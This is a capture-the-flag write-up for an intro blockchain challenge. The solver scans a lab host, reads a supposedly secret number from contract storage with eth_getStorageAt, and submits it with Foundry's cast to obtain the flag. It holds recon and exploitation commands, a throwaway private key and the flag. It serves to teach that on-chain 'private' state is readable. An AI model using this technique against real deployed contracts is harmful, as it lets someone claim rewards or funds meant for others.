# Unlimited Void – Writeup

**Category:** Blockchain  
**Difficulty:** (my guess) Easy / Intro  
**Flag:** `MCTF{...}`

---

## Challenge Description

> **Unlimited Void**  
>  
> 412  
> Mārtiņš #369  
>  
> “Can you guess the number?”  
>  
> RPC Port: 8545  
> TCP Port: 31337  
>  
> IP: `10.240.3.239`

We’re told to “guess the number”, there’s an Ethereum JSON-RPC endpoint on `8545`, and a custom service on `31337`. Classic “don’t brute force the number, read it on-chain” type challenge.

---

## Recon

### Port scan

```bash
nmap -sC -sV -p 8545,31337 10.240.3.239
```

Results (trimmed):

- `8545/tcp` open, HTTP-based, responds like an Ethereum JSON-RPC service.
- `31337/tcp` open, custom text protocol:

```text
Welcome to the KiB Blockchain Challenge Manager
Challenge ID: UnlimitedVoid
Commands: info | reset | flag | fund <address> [eth]
```

So port **31337** is a “challenge manager” for the CTF, and **8545** is the blockchain backend.

---

## Interacting with the Challenge Manager

Connect with netcat:

```bash
nc 10.240.3.239 31337
```

Use `info`:

```text
> info
id: UnlimitedVoid
rpc_port: 8545
chain_id: 31337
contract: 0xB2C9d104D66518805ABe008abf894529Da71394a
deployer: 0xb38c6508a68cFd0eB6476551DF078864d1b8eda6
```

So the core contract we care about is:

```text
CONTRACT = 0xB2C9d104D66518805ABe008abf894529Da71394a
CHAIN_ID = 31337
RPC_URL  = http://10.240.3.239:8545
```

---

## Confirming the Chain

Check the client via JSON-RPC:

```bash
curl -s -X POST http://10.240.3.239:8545   -H "Content-Type: application/json"   --data '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":1}'

# -> {"jsonrpc":"2.0","id":1,"result":"anvil/v1.4.4"}
```

So this is an **Anvil** local test chain.

---

## Reading Contract Storage (Stealing the “Secret Number”)

Idea: the challenge is “guess the number”, but on Ethereum, private state variables are only *logically* private. If the contract stores the secret in a state variable, we can just use `eth_getStorageAt` to read it directly.

First, we probe a few storage slots:

```bash
CONTRACT=0xB2C9d104D66518805ABe008abf894529Da71394a

for i in $(seq 0 5); do
  SLOT=$(printf "0x%x" $i)
  RESP=$(curl -s -X POST http://10.240.3.239:8545     -H "Content-Type: application/json"     --data "{"jsonrpc":"2.0","method":"eth_getStorageAt","params":["$CONTRACT","$SLOT","latest"],"id":$i}")
  HEX=$(echo "$RESP" | sed -n 's/.*"result":"\([^"]*\)".*//p')
  echo "slot $i: $HEX"
done
```

Output:

```text
slot 0: 0x0000000000000000000000000000000000000000000000000000000000000000
slot 1: 0x0da9ff9a638c9ec2215eaed5a8012c60be084baeb5097232a15f28c857284f06
slot 2: 0x0000000000000000000000000000000000000000000000000000000000000000
slot 3: 0x0000000000000000000000000000000000000000000000000000000000000000
slot 4: 0x0000000000000000000000000000000000000000000000000000000000000000
slot 5: 0x0000000000000000000000000000000000000000000000000000000000000000
```

Slot `1` is clearly interesting: a non-zero `bytes32`-like value.  
That’s almost certainly the “secret number” (probably stored as a `uint256` or `bytes32`).

We **don’t actually need** the decimal form, because we can pass the hex value directly to the contract function later.

So we keep:

```text
SECRET = 0x0da9ff9a638c9ec2215eaed5a8012c60be084baeb5097232a15f28c857284f06
```

---

## Getting an Account and Funding It

We use Foundry (`cast`) to create an EOA and interact with the chain.

### 1. Create a wallet

```bash
cast wallet new
```

Example output:

```text
Successfully created new keypair.
Address: 0x4Ce6Ae2012364F5114f4a2C82F4011b16D9DC16e
Private key: 0xaa0ac4171981ba0eedb727bf987a2ca5500224ec6758faa3871079fba1def49b
```

(Obviously, this key is only for the CTF.)

### 2. Fund via the challenge manager

Back on port `31337`:

```bash
nc 10.240.3.239 31337
```

Then:

```text
> fund 0x4Ce6Ae2012364F5114f4a2C82F4011b16D9DC16e 1
ok=true
```

Check balance:

```bash
export RPC_URL=http://10.240.3.239:8545
cast balance 0x4Ce6Ae2012364F5114f4a2C82F4011b16D9DC16e --rpc-url $RPC_URL
# 1000000000000000000 (1 ether)
```

---

## Calling the Contract with the Stolen Secret

We suspect the contract exposes a function like `guess(uint256)` that checks if our input matches the secret and, if so, marks us as “winner”.

First, set up some env variables:

```bash
export RPC_URL=http://10.240.3.239:8545
export CHAIN_ID=31337
export CONTRACT=0xB2C9d104D66518805ABe008abf894529Da71394a
export PK=0xaa0ac4171981ba0eedb727bf987a2ca5500224ec6758faa3871079fba1def49b
export SECRET=0x0da9ff9a638c9ec2215eaed5a8012c60be084baeb5097232a15f28c857284f06
```

Then we try the most obvious ABI first: `guess(uint256)`:

```bash
cast send $CONTRACT "guess(uint256)" $SECRET   --rpc-url $RPC_URL   --chain-id $CHAIN_ID   --private-key $PK
```

Output (trimmed):

```text
blockHash 0x70677ee7c78ca4a9cc27897320cb598716201605365c2625bc00d70360beaaff
blockNumber 4
from 0x4Ce6Ae2012364F5114f4a2C82F4011b16D9DC16e
to   0xB2C9d104D66518805ABe008abf894529Da71394a
status 1 (success)
...
```

`status 1 (success)` means the transaction did **not** revert, so we hit a valid function and the guess was accepted.

(We also tried `guess(bytes32)` and `solve(...)` variants out of curiosity, but those reverted; `guess(uint256)` was the correct one.)

---

## Getting the Flag

Once the on-chain state is updated, the manager recognizes that the challenge is solved.

Reconnect:

```bash
nc 10.240.3.239 31337
```

Then:

```text
> flag
Congratulations, challenge solved!
MCTF25{sh0uld_h4v3_us3d_m0n3r0}
```

